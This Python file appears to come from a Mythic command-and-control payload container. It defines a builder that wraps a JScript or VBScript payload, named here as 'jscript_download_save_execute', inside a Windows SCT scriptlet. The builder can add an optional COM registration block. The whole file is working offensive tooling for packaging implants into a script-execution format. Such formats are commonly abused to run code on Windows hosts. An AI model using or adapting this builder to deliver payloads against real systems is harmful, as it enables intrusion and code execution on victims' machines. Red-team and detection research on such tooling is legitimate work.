import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os
import shutil
import base64
import random



class sct_wraps_script(PayloadType):
    name = "sct_wraps_script"
    file_extension = "sct"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["jscript_download_save_execute"]
    note = """Creates a SCT payload from a JScript or VBScript script"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "file"
    agent_icon_path = agent_path / "agent_functions" / "file.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name = "progid",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="Defines the progid value in the SCT file, if left empty, the <registration> part will not added in the SCT",
        ),
        BuildParameter(
            name = "classid",
            parameter_type=BuildParameterType.String,
            default_value="{F000F000-0000-0000-0000-000000000001}",
            description="Defines the classid value in the SCT file",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            script_payload = self.wrapped_payload.decode()

            response = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(
                PayloadUUID=self.wrapped_payload_uuid,
            ))

            progid = self.get_parameter('progid')
            classid = self.get_parameter('classid')

            if response.Success == False:
                resp.set_status(BuildStatus.Error)
                resp.build_stderr = "Unable to get target payload"
                return resp

            if "vbs" in response.Payloads[0].PayloadType:
                script_type = "VBScript"
            elif "jscript" in response.Payloads[0].PayloadType:
                script_type = "JScript"
            else:
                resp.set_status(BuildStatus.Error)
                resp.build_stderr = "Unsupported payload"
                return resp
            
            payload = """<?XML version="1.0"?>
<scriptlet>
{payload}
</scriptlet>"""

            script_block = """<script language="{script_type}">
<![CDATA[
{script_payload}
]]>
</script>""".format(script_type=script_type, script_payload=script_payload)

            if len(progid) != 0: 
                scriptlet_payload = """<registration progid="{progid}" classid="{classid}" >
{script_block}
</registration>""".format(progid=progid, classid=classid, script_block=script_block)
            else:
                scriptlet_payload = script_block

            resp.payload = payload.format(payload=scriptlet_payload)
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
